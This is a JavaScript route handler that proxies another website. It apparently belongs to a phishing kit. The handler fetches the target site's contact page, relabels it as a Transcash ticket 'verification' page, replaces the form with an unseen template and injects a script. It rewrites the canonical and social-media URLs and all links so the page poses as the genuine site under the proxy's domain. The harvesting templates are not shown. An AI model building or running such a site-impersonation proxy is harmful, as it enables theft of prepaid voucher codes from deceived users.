const cheerio = require('cheerio');
const rewriteLinks = require('../utils/rewriteLinks');
const addnavlink = require('../utils/addnavlink');
const fs = require('fs');
const path = require('path');

const verification = async (req, res, TARGET_URL, PROXY_URL) => {
    
  const response = await fetch(`${TARGET_URL}contact`);
  const buffer = await response.arrayBuffer();
  let html = Buffer.from(buffer).toString('utf8');

  // Modification avec Cheerio
  const $ = cheerio.load(html);
  
  // Exemple de modifications
  $('title').text('Vérification - Transcash Recharge');
  $('.text-center.mb-4').text('Vérification');
  
  // Vider tous les enfants
  $('.form-bzhd-bootsrap-4').empty();

  const template = fs.readFileSync(path.join(__dirname, '../templates/template.html'), 'utf8');
  $('.form-bzhd-bootsrap-4').append(template);


  $('meta[property=og:description]').attr("content", "Ici, vous pouvez vérifier l'authenticité ou la validité d'un ticket de recharge Transcash");
  $('meta[property=og:title]').attr("content", "Vérification - Transcash Recharge");
  $('meta[property=og:url]').attr("content", `${PROXY_URL}/verification`);
  $('link[rel=canonical]').attr("href", `${PROXY_URL}/verification`);
 

  //le script
  const scripttemplate = fs.readFileSync(path.join(__dirname, '../templates/scriptTemplate.html'), 'utf8');
  $('body').append(scripttemplate);

  html = $.html();

  // Appliquer tes middlewares existants
  html = rewriteLinks(html, TARGET_URL, PROXY_URL);
  html = addnavlink(html, PROXY_URL);

  const finalBody = Buffer.from(html, 'utf8');
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Content-Length', finalBody.length);
  res.end(finalBody);
}

module.exports = verification;